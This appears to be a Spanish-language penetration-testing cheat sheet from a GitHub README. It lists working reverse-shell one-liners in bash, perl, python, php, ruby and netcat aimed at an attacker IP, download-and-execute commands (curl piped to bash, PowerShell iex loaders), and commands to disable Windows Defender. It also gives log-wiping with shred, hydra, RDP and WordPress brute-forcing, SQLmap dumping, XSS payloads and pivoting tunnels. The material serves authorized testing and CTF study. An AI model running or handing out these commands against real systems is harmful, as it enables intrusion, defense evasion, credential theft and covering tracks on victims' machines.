# ayudas
TRANSFERENCIA DE ARCHIVOS  
.........................

sudo python -m http.server 80
sudo python -m SimpleHTTPServer 80

     Target Linux: 
         wget http://[IP]/recurso
         
     Target Windows:
         powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"
         Invoke-WebRequest http://[IP]/[RECURSO] -OutFile [NOMBREQUEQUERAMOS]
         powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
         powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
         
sudo python smbserver.py [como se llamara el recurso a compartir] [nombre del recurso a compartir] ej smbserver.py compartida /home/user
    Para conectarse: copy \\IP\recurso


TRATAMIENTO TTY
...............

LINUX
   script /dev/null -c bash
   ctrl+z
   stty raw-echo
   fg
   reset
   xterm
   export TERM=xterm
   export SHELL=bash
   stty rows 52 columns 180
   
WINDOWS
   https://github.com/antonioCoco/ConPtyShell


FUZZING WEB
...........

wfuzz -c -t 400 --hc=404 -w [wordlist] [url]/FUZZ
wfuzz -c -t 400 --hc=404 -w [wordlist] -w [archivo_extensiones] [url]/FUZZ.FUZ2Z
wfuzz -c -t 400 --hc=404 -z range,0-100 http://IP/note.php?note=FUZZ --> probar numeros del 0 al 100

nmap --script http-enum -p [PUERTO] [IP]

gobuster dir --url http://IP --wordlist /usr/share/wordlists/dirb/big.txt

dirb http://IP /path/to/wordlist

dirsearch -u http://[IP]/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 150 -e php,txt,html -f

Si para acceder al sitio web salta un cuadro emergente pidiendo credenciales y las conocemos, para fuzzear esa parte a la que accedemos despues del login:
    dirb http://[IP]/ -u user:password


REVERSE SHELL
.............

https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/
https://deephacking.tech/reverse-shells-en-windows/

si no funciona....
    1.creamos un script .sh con bash -i >& /dev/tcp/IP/PUERTO 0>&1
    2.compartimos ese archivo mediante python -m....
    3.lo ejecutamos /usr/bin/curl IP/ARCHIVO|bash


Los siguientes ejemplos suponen que la IP del atacante es 8.8.8.8 y utiliza el puerto 8080 para la conexión.
Por lo tanto, en todos estos casos, debe escuchar el puerto 8080 con el siguiente comando:
nc -vv -l -p 8080

// Bash
bash -i >& /dev/tcp/8.8.8.8/8080 0>&1

// Perl
perl -e 'use Socket;$i="8.8.8.8";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

// Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("8.8.8.8",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

// PHP
php -r '$sock=fsockopen("8.8.8.8",8080);exec("/bin/sh -i <&3 >&3 2>&3");'

// Ruby
ruby -rsocket -e'f=TCPSocket.open("8.8.8.8",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

// Netcat
nc -e /bin/sh 8.8.8.8 8080

// PowerShell
https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/


WEB SHELL
..........

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
https://book.hacktricks.xyz/shells/shells/msfvenom
https://github.com/frizb/MSF-Venom-Cheatsheet
    

COMMON PORTS
............

25 - SMTP
22 - SSH
110 - POP3
143 - IMAP
80 - HTTP
443 - HTTPS
8080 - HTTP Proxy
137, 138, 139 - NETBIOS
115 - SFTP
23 - Telnet
21 - FTP
3389 - RDP
3306 - MySQL
1433 - MS SQL Server
445 - SMB
123 - NTP
179 - BGP
69 - TFTP
88 - Kerberos
102 - MS Exchange


HOW TO SET ROUTE
.................

ip route add <Network To Which We Need Access> via <GATEWAY>
    ejemplo:
        ip route add 192.168.1.0/24 via 10.10.15.1


BANNER GRABING
...............

nc -nv  <IP> <port>


SQLMAP
.......

sqlmap -u http://[IP] -p parameter

sqlmap -u http://[IP] –os-shell

sqlmap -u http://[IP] –dump

sqlmap -u http://[IP]/?id=1 --dbs

sqlmap -u http://[IP]/?id=1 -D database_name --tables

sqlmap -u http://[IP]/?id=1 -D database_name -T table_name --columns

sqlmap -u http://[IP]/?id=1 -D database_name -T table_name --dump-all

More....https://hackersonlineclub.com/sql-injection-cheatsheet/


CRACKING PASSWORDS/LOGIN WEB
.............................

https://hashes.com/en/decrypt/hash
https://hashcat.net/wiki/doku.php?id=example_hashes

sudo john --format=[format] --wordlist=[path to wordlist] [path to file]

hydra -L users.txt -P pass.txt -t 10 <IP address> ssh -s 22

hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

Replace "ssh" with any service name

hydra -L user.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form "[URL]:[TOKEN-URL]:Login failed"
   Ejemplo: hydra -L /home/kali/Downloads/users.txt -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.134.16/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=050toadub7n33f96ehi7jo83o1; security=low; security=low:F=Username and/or password incorrect' 


SMB
....

enum4linux -a <IP address>
smbclient -L IP -N

    Para conectarse:
        smbclient //IP/RECURSO -n
    Una vez dentro para descargar archivos:
        prompt off
        mget *
        smbget -R smb://IP/recurso

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse [IP]


NFS
....

*Listar recursos nfs en una maquina:
    showmount -e [IP]

*Para conectarse al recurso:
    sudo mount -t nfs IP:/recurso unacarpetanuestra


BORRAR RASTRO RAPIDAMENTE EN MAQUINAS LINUX
............................................

shred -zun 5 -v

https://hackingpassion.com/clear-your-tracks-on-linux/
https://null-byte.wonderhowto.com/how-to/clear-logs-bash-history-hacked-linux-systems-cover-your-tracks-remain-undetected-0244768/


ESCAPAR COMANDOS
.................

Simplemente hay que poner ciertos carácteres aleatorios ocupando el espacio que habria al poner el comando normal con su ruta completa, por ejemplo:

cat
    normal= cat /etc/passwd 
    extendido= /bin/cat /etc/passwd
    extendido escapado= /???/??t /etc/passwd
    extendido normal=c${HOA}at /etc/passwd


METASPLOIT INIT
................

sudo msfdb init
sudo service postgresql start
sudo msfconsole


TRATAMIENTO DE IMAGENES
........................

exiftool imagen.png --> Sacar datos exif de una imagen
strings imagen.png --> Sacar los strings, texto, datos ocultos de una imagen


OTROS RECURSOS
...............

Extension firefox Hack-Tools
Hacking_Help_Sheet_Resume1.png
Hacking_Help_Sheet_Resume2.png


BUSCAR ARCHIVOS SUID,SGID,StickyBit
....................................

find / -perm -u=s -type f 2>/dev/nul
find / -perm -4000 2>/dev/null


WPSCAN
.......

wpscan --url [URL] -e u
wpscan --url [URL]
wpscan --url [URL] --usernames admin --passwords rockyou.txt --max-threads 5 --> Fuerza bruta panel login wordpress
wpscan --url [URL] -e vp --> Enumerar plugins vulnerables en el sitio web


NIKTO
.....

nikto -h scanme.nmap.org
nikto -h https://nmap.org -ssl


WINDOWS TRICKS
...............

Información sobre Windows Defender → "sc query windefend"

Enumeración de todos los servicios corriendo en la máquina (incluyendo antivirus) → "sc queryex type= service"

Enumeración de los antivirus que tiene el equipo → "WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName"

Configuración y estado del firewall (características activadas y desactivadas...) → "netsh advfirewall firewall dump"

Podemos probar a deshabilitar el escaneo de todos los ficheros descargados y/o adjuntos para subir nuestros ficheros... → "Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus" luego → "Set-MpPreference -DisableIOAVProtection $true"

Listar reglas de AppLocker → "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections"


LINUX TRICKS /var/www/html
...........................

Si tras ganar acceso a una shell en la maquina objetivo, somos un usuario con pocos privilegios pero tenemos acceso a /var/www/html podemos buscar mediante el siguiente comando find archivos de configuracion que contengan contraseñas o datos sensibles, para empezar a ganar privilegios:
    find . -iname '*config*' -type f -exec grep -nie 'pass.*=' --color=always /dev/null {} \;


RDP
....

xfreerdp /v:[IP] -sec-nla /u:"" -- Recon
xfreerdp /u:[USER] /p:[PASS] /v:[IP] /cert-ignore -- Para conectarse por RDP a un equipo

ncrack -vv --user user -P wordlist.txt [IP]:3389 -- Try cracking rdp login

crowbar -b rdp -u user -C password_wordlist -s [IP] -v -- Other method to try cracking 


VULNERABILIDAD LOG4J
....................

https://guglia001.github.io/cve/poc/articulo/log4j-CVE-POC/
https://jmlgomez73.github.io/log4shell/
https://github.com/fullhunt/log4j-scan


ACTIVE DIRECTORY
................

https://www.hackplayers.com/2022/03/top10-de-ataques-al-directorio-activo.html


DESCARGA DE ARCHIVOS POR COMANDO
.................................

Linux --> wget [URL]
Windows --> powershell -c "Invoke-WebRequest -Uri '[URL]'" -OutFile archivo


XSS
....

<script>alert('Found')</script>
"><script>alert(Found)</script>">
<script>alert(String.fromCharCode(88,83,83))</script>
"  onload="alert(String.fromCharCode(88,83,83))
" onload="alert('XSS')
<img src='bla' onerror=alert("XSS")>

      Mario Bros XSS
         <iframe src="https://jcw87.github.io/c2-smb1/" width="100%" height="600"></iframe>
         <input onfocus="document.body.innerHTML=atob('PGlmcmFtZSBzcmM9Imh0dHBzOi8vamN3ODcuZ2l0aHViLmlvL2MyLXNtYjEvIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSI2MDAiPjwvaWZyYW1lPg==')" autofocus>
         
  
WORDLISTS
..........

PacketStorm
SecList
cotse
DefaultPassword
RouterPassword
Pastebin
RainbowCrack

ENUMERACION WEB
................
DNS
   dig axfr [dominio]
   nslookup
whatweb [URL]
curl --> https://www.keycdn.com/support/popular-curl-examples


AUTORECON TOOL
...............
sudo apt update
sudo apt install python3
sudo apt install python3-pip
sudo apt install seclists
sudo apt install curl dnsrecon enum4linux feroxbuster gobuster impacket-scripts nbtscan nikto nmap onesixtyone oscanner redis-tools smbclient smbmap snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf
sudo apt install python3-venv
python3 -m pip install --user pipx
python3 -m pipx ensurepath
[close terminal]
[open terminal]
pipx install git+https://github.com/Tib3rius/AutoRecon.git
sudo env "PATH=$PATH" autorecon [IP]

PIVOTING
.........
SSH Local Port Forwarding:
     ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]
     ssh -L source_port:forward_to_host:destination_port via_host

SSH Remote Port Forwarding:
     ssh -R sourcePort:HostToForwardTrafficTo:onPort connectToHost
     ssh -R PORT:IP:port root@ip

Windows Netsh:
     netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport

Metasploit
     portfwd add –l 3389 –p 3389 –r target-host

Socat
     https://github.com/3ndG4me/socat
     socat TCP4-LISTEN:81 TCP4:IP:PORT
     socat TCP4-LISTEN:81,fork,reuseaddr TCP4:TCP4:IP

Proxychains (Configurar primero Proxychains socks4 o socks5)
     /etc/proxychains.conf
     [ProxyList]
     socks4 localhost 8080
     socks5 localhost 1080

Chisel
     https://github.com/jpillora/chisel
     Server: chisel server -p 443 -reverse -v --socks5
     Client: chisel client <server_ip>:443 R:socks

Sshuttle:
     https://github.com/sshuttle/sshuttle
     sshuttle -r username@sshserver IP -vv
     DNS: sshuttle --dns -vvr username@sshserver 0/0

SharpSocks:
     https://github.com/nettitude/SharpSocks

Pivotnacci:
     https://github.com/blackarrowsec/pivotnacci
     pivotnacci https[:]//domain[.]com/agent  --password "s3cr3t"
     pivotnacci https[:]//domain[.]com/agent  --polling-interval 2000

Metasploit
     run autoroute -s subnet /24
     route add subnet subnet_mask session_id 
     use auxiliary/server/socks_proxy

Para utilizar los túneles y pasar a traves de internet, podemos usar VPS o herramientas como Ngrok.
https://lnkd.in/dBqFskwM
./ngrok http 4433
./ngrok tcp 4433

Footer
© 2023 GitHub, Inc.
Footer navigation
Terms
Privacy
Security
Status
Docs
Contact GitHub
Pricing
API
Training
Blog
About
